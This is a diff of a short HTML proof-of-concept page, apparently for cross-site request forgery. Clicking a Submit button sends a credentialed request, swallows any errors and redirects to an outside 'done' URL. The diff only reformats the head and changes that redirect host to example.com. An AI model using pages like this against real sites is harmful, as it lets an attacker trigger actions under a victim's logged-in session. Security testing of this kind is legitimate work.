@@ -1,6 +1,9 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"><title>poc</title></head>
+<head>
+  <meta charset="utf-8">
+  <title>poc</title>
+</head>
 <body>
   <button id="go">Submit</button>
   <script>
@@ -11,8 +14,8 @@
           credentials: 'include'
         });
       } catch (e) {}
-      // Optional: signal completion to your server
-      setTimeout(() => location.href = 'https://cisco.website/done', 500);
+      // Optional: signal completion to your infra/logs
+      setTimeout(() => location.href = 'https://example.com/done', 500);
     }
     document.getElementById('go').addEventListener('click', go);
   </script>
